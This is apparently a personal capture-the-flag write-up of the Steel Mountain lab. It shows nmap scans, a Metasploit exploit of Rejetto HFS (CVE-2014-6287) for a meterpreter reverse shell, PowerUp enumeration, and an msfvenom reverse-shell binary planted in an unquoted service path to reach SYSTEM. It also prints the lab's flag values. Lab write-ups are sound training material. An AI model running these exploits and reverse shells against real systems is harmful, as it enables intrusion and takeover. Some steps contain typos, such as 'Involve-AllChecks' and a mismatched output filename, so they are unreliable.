[[Writeup]]]

![[Pasted image 20250511225759.png]]

## Enumeration

```
┌──(dd0x㉿kali)-[~]
└─$ nmap -p- --min-rate 10000 10.10.118.118
Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-11 10:57 EDT
Warning: 10.10.118.118 giving up on port because retransmission cap hit (10).
Nmap scan report for 10.10.118.118
Host is up (0.26s latency).
Not shown: 65510 closed tcp ports (reset)
PORT      STATE    SERVICE
80/tcp    open     http
135/tcp   open     msrpc
139/tcp   open     netbios-ssn
445/tcp   open     microsoft-ds
3389/tcp  open     ms-wbt-server
5985/tcp  open     wsman
8080/tcp  open     http-proxy
19876/tcp filtered unknown
27927/tcp filtered unknown
38118/tcp filtered unknown
45747/tcp filtered unknown
47001/tcp open     winrm
49152/tcp open     unknown
49153/tcp open     unknown
49154/tcp open     unknown
49155/tcp open     unknown
49156/tcp open     unknown
49163/tcp open     unknown
49164/tcp open     unknown
50094/tcp filtered unknown
52420/tcp filtered unknown
52498/tcp filtered unknown
53425/tcp filtered unknown
59324/tcp filtered unknown
64455/tcp filtered unknown

Nmap done: 1 IP address (1 host up) scanned in 15.73 seconds
```

```
┌──(dd0x㉿kali)-[~]
└─$ nmap -p 80,135,139,445,3389,5985,8080 -sCV 10.10.118.118      
Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-11 11:00 EDT
Nmap scan report for 10.10.118.118
Host is up (0.25s latency).

PORT     STATE SERVICE       VERSION
80/tcp   open  http          Microsoft IIS httpd 8.5
|_http-server-header: Microsoft-IIS/8.5
|_http-title: Site doesn't have a title (text/html).
| http-methods: 
|_  Potentially risky methods: TRACE
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds  Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: STEELMOUNTAIN
|   NetBIOS_Domain_Name: STEELMOUNTAIN
|   NetBIOS_Computer_Name: STEELMOUNTAIN
|   DNS_Domain_Name: steelmountain
|   DNS_Computer_Name: steelmountain
|   Product_Version: 6.3.9600
|_  System_Time: 2025-05-11T15:00:23+00:00
| ssl-cert: Subject: commonName=steelmountain
| Not valid before: 2025-05-10T14:54:58
|_Not valid after:  2025-11-09T14:54:58
|_ssl-date: 2025-05-11T15:00:29+00:00; -1s from scanner time.
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
8080/tcp open  http          HttpFileServer httpd 2.3
|_http-title: HFS /
|_http-server-header: HFS 2.3
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
|_nbstat: NetBIOS name: STEELMOUNTAIN, NetBIOS user: <unknown>, NetBIOS MAC: 02:03:a1:c2:65:c3 (unknown)
| smb-security-mode: 
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-time: 
|   date: 2025-05-11T15:00:23
|_  start_date: 2025-05-11T14:54:52
| smb2-security-mode: 
|   3:0:2: 
|_    Message signing enabled but not required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 16.76 seconds

```

#### Question 1
Who is the employee of the month?
`Bill Harper`

## Access port

upon checking port 8080 which is a http file server
![[Pasted image 20250511230405.png]]

There is a server information which we might get from exploit-db
![[Pasted image 20250511230710.png]]
`www.rejetto.com/hfs/`

now we find some exploits 
```
┌──(dd0x㉿kali)-[~]
└─$ searchsploit rejetto http file server
----------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                             |  Path
----------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Rejetto HTTP File Server (HFS) - Remote Command Execution (Metasploit)                                                                                     | windows/remote/34926.rb
Rejetto HTTP File Server (HFS) 1.5/2.x - Multiple Vulnerabilities                                                                                          | windows/remote/31056.py
Rejetto HTTP File Server (HFS) 2.2/2.3 - Arbitrary File Upload                                                                                             | multiple/remote/30850.txt
Rejetto HTTP File Server (HFS) 2.3.x - Remote Command Execution (1)                                                                                        | windows/remote/34668.txt
Rejetto HTTP File Server (HFS) 2.3.x - Remote Command Execution (2)                                                                                        | windows/remote/39161.py
Rejetto HTTP File Server (HFS) 2.3a/2.3b/2.3c - Remote Command Execution                                                                                   | windows/webapps/34852.txt
Rejetto HttpFileServer 2.3.x - Remote Command Execution (3)                                                                                                | windows/webapps/49125.py
----------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results

```

Lets check the first exploit code
`Rejetto HTTP File Server (HFS) - Remote Command Execution (Metasploit)`

```
┌──(dd0x㉿kali)-[~]
└─$ searchsploit windows/remote/34926.rb -x 
  Exploit: Rejetto HTTP File Server (HFS) - Remote Command Execution (Metasploit)
      URL: https://www.exploit-db.com/exploits/34926
     Path: /usr/share/exploitdb/exploits/windows/remote/34926.rb
    Codes: CVE-2014-6287, OSVDB-111386
 Verified: True
File Type: Ruby script, ASCII text

```

#### Scan the machine with nmap. What is the other port running a web server on?
`8080`
#### Take a look at the other web server. What file server is running?
`Rejetto HTTP File Server`
#### What is the CVE number to exploit this file server?
`CVE-2014-6287`
#### Use Metasploit to get an initial shell. What is the user flag?

Open the metasploit `msfconsole`

```
msf6 > search CVE-2014-6287

Matching Modules
================

   #  Name                                   Disclosure Date  Rank       Check  Description
   -  ----                                   ---------------  ----       -----  -----------
   0  exploit/windows/http/rejetto_hfs_exec  2014-09-11       excellent  Yes    Rejetto HttpFileServer Remote Command Execution

```

We use that exploit `use 0`

```
msf6 exploit(windows/http/rejetto_hfs_exec) > options

Module options (exploit/windows/http/rejetto_hfs_exec):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   HTTPDELAY  10               no        Seconds to wait before terminating web server
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                      yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT      80               yes       The target port (TCP)
   SRVHOST    0.0.0.0          yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses.
   SRVPORT    8080             yes       The local port to listen on.
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   SSLCert                     no        Path to a custom SSL certificate (default is randomly generated)
   TARGETURI  /                yes       The path of the web application
   URIPATH                     no        The URI to use for this exploit (default is random)
   VHOST                       no        HTTP server virtual host


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     192.168.190.134  yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic

```

Lets modify the required commands:
**RHOSTS** — The IP address of the victim at which we want to target  
**RPORT** —It is the port to which we want to listen, as discovered by nmap’s scan, and we can modify it to port 8080  
**SRVPORT** — We can change it to another port that will not affect us.  
**LHOST** — It’s our own machine, and telling it where to start and listening  
**LPORT** — Our personal listening port

```
msf6 exploit(windows/http/rejetto_hfs_exec) > set RHOST 10.10.118.118
RHOST => 10.10.118.118
msf6 exploit(windows/http/rejetto_hfs_exec) > set LHOST 10.23.62.59
LHOST => 10.23.62.59
msf6 exploit(windows/http/rejetto_hfs_exec) > set RPORT 8080
RPORT => 8080
msf6 exploit(windows/http/rejetto_hfs_exec) > set SRVPORT 9090
SRVPORT => 9090
```


Now we have gain access to the Windows Machine
```
msf6 exploit(windows/http/rejetto_hfs_exec) > exploit
[*] Started reverse TCP handler on 10.23.62.59:4444 
[*] Using URL: http://10.23.62.59:9090/9hubxTGDGR
[*] Server started.
[*] Sending a malicious request to /
[*] Payload request received: /9hubxTGDGR
[*] Sending stage (177734 bytes) to 10.10.118.118
[!] Tried to delete %TEMP%\IsIahcciqm.vbs, unknown result
[*] Meterpreter session 1 opened (10.23.62.59:4444 -> 10.10.118.118:49223) at 2025-05-11 11:19:34 -0400
[*] Server stopped.

meterpreter >
```

Lets find some interesting files here
```
meterpreter > ls
Listing: C:\Users\bill\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
====================================================================================

Mode              Size    Type  Last modified              Name
----              ----    ----  -------------              ----
040777/rwxrwxrwx  0       dir   2025-05-11 11:19:33 -0400  %TEMP%
100666/rw-rw-rw-  174     fil   2019-09-27 07:07:07 -0400  desktop.ini
100777/rwxrwxrwx  760320  fil   2014-02-16 15:58:52 -0500  hfs.exe

```

```
meterpreter > cd c:/users/bill/desktop
meterpreter > ls
Listing: c:\users\bill\desktop
==============================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
100666/rw-rw-rw-  282   fil   2019-09-27 07:07:07 -0400  desktop.ini
100666/rw-rw-rw-  70    fil   2019-09-27 08:42:38 -0400  user.txt

```

## User Flag
```
meterpreter > cat user.txt
��b04763b6fcf51fcd7c13abc7db4fd365
```

## Privilege Escalation

downlaod the script file
`wget https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1`

upload to the meterpreter
```
┌──(dd0x㉿kali)-[~]
└─$ realpath PowerUp.ps1                
/home/kali/PowerUp.ps1
```

```
meterpreter > upload /home/kali/PowerUp.ps1
[*] Uploading  : /home/kali/PowerUp.ps1 -> PowerUp.ps1
[*] Uploaded 586.50 KiB of 586.50 KiB (100.0%): /home/kali/PowerUp.ps1 -> PowerUp.ps1
[*] Completed  : /home/kali/PowerUp.ps1 -> PowerUp.ps1
meterpreter > ls
Listing: c:\users\bill\desktop
==============================

Mode              Size    Type  Last modified              Name
----              ----    ----  -------------              ----
100666/rw-rw-rw-  600580  fil   2025-05-11 11:36:09 -0400  PowerUp.ps1
100666/rw-rw-rw-  282     fil   2019-09-27 07:07:07 -0400  desktop.ini
100666/rw-rw-rw-  70      fil   2019-09-27 08:42:38 -0400  user.txt
```

1st — **load_powershell** — Enables users to automate a variety of time-consuming administrative operations as well as discover, filter, and export information about network computers.

2nd — **powershell_shell** — To get the powershell up and running, follow these steps.

3rd — **. .\PowerUp.ps1 —** To choose the file or shell we plan to use

4th — **Involve-AllChecks —** Output any vulnerabilities that can be discovered, as well as descriptions for any abuse functionalities

```
ServiceName    : AdvancedSystemCareService9
Path           : C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe
ModifiablePath : @{ModifiablePath=C:\; IdentityReference=BUILTIN\Users; Permissions=AppendData/AddSubdirectory}
StartName      : LocalSystem
AbuseFunction  : Write-ServiceBinary -Name 'AdvancedSystemCareService9' -Path <HijackPath>
CanRestart     : True
Name           : AdvancedSystemCareService9
Check          : Unquoted Service Paths

```

cjecl the path
```
C:\Program Files (x86)\IObit
Check          : Unquoted Service Paths
```

restart and and upload this file
`msfvenom -p windows/shell_reverse_tcp LHOST=CONNECTION_IP LPORT=4443 -e x86/shikata_ga_nai -f exe-service -o Advanced.ex`

```
meterpreter > cd C:/Users/bill
meterpreter > cd 'C:\Program Files (x86)\IObit'
meterpreter > ls
Listing: C:\Program Files (x86)\IObit
=====================================

Mode              Size   Type  Last modified              Name
----              ----   ----  -------------              ----
040777/rwxrwxrwx  32768  dir   2025-05-11 10:55:48 -0400  Advanced SystemCare
040777/rwxrwxrwx  16384  dir   2019-09-27 01:35:24 -0400  IObit Uninstaller
040777/rwxrwxrwx  4096   dir   2019-09-26 11:18:50 -0400  LiveUpdate

```

```
meterpreter > upload /home/kali/Advanced.exe
[*] Uploading  : /home/kali/Advanced.exe -> Advanced.exe
[*] Uploaded 15.50 KiB of 15.50 KiB (100.0%): /home/kali/Advanced.exe -> Advanced.exe
[*] Completed  : /home/kali/Advanced.exe -> Advanced.exe
meterpreter > ls
Listing: C:\Program Files (x86)\IObit
=====================================

Mode              Size   Type  Last modified              Name
----              ----   ----  -------------              ----
040777/rwxrwxrwx  32768  dir   2025-05-11 10:55:48 -0400  Advanced SystemCare
100777/rwxrwxrwx  15872  fil   2025-05-11 11:53:24 -0400  Advanced.exe
040777/rwxrwxrwx  16384  dir   2019-09-27 01:35:24 -0400  IObit Uninstaller
040777/rwxrwxrwx  4096   dir   2019-09-26 11:18:50 -0400  LiveUpdate

```

Now we need to do RCE

**Return to the meterpreter shell** and follow the steps below once the netcat has been launched as shown in the image above:1st — **shell** 2nd — **sc stop AdvancedSystemCareService9** 3rd — **sc start AdvancedSystemCareService9**

```
meterpreter > shell
Process 1808 created.
Channel 6 created.
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

C:\Program Files (x86)\IObit>sc stop AdvancedSystemCareService9
sc stop AdvancedSystemCareService9

SERVICE_NAME: AdvancedSystemCareService9 
        TYPE               : 110  WIN32_OWN_PROCESS  (interactive)
        STATE              : 4  RUNNING 
                                (STOPPABLE, PAUSABLE, ACCEPTS_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0

C:\Program Files (x86)\IObit>sc start AdvancedSystemCareService9
sc start AdvancedSystemCareService9

SERVICE_NAME: AdvancedSystemCareService9 
        TYPE               : 110  WIN32_OWN_PROCESS  (interactive)
        STATE              : 2  START_PENDING 
                                (NOT_STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x7d0
        PID                : 2672
        FLAGS              : 

C:\Program Files (x86)\IObit>

```


now we got the access of it
```
┌──(dd0x㉿kali)-[~]
└─$ nc -nlvp 4443               
listening on [any] 4443 ...
connect to [10.23.62.59] from (UNKNOWN) [10.10.118.118] 49264
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

C:\Windows\system32>
```


```
C:\Users>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 2E4A-906A

 Directory of C:\Users

09/26/2019  11:29 PM    <DIR>          .
09/26/2019  11:29 PM    <DIR>          ..
09/26/2019  07:11 AM    <DIR>          Administrator
09/27/2019  09:09 AM    <DIR>          bill
08/22/2013  08:39 AM    <DIR>          Public
               0 File(s)              0 bytes
               5 Dir(s)  44,154,851,328 bytes free
```

```
C:\Users\Administrator\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 2E4A-906A

 Directory of C:\Users\Administrator\Desktop

10/12/2020  12:05 PM    <DIR>          .
10/12/2020  12:05 PM    <DIR>          ..
10/12/2020  12:05 PM             1,528 activation.ps1
09/27/2019  05:41 AM                32 root.txt
               2 File(s)          1,560 bytes
               2 Dir(s)  44,154,851,328 bytes free

C:\Users\Administrator\Desktop>cat root.txt
cat root.txt
'cat' is not recognized as an internal or external command,
operable program or batch file.

C:\Users\Administrator\Desktop>type root.txt
type root.txt
9af5f314f57607c00fd09803a587db80
C:\Users\Administrator\Desktop>
```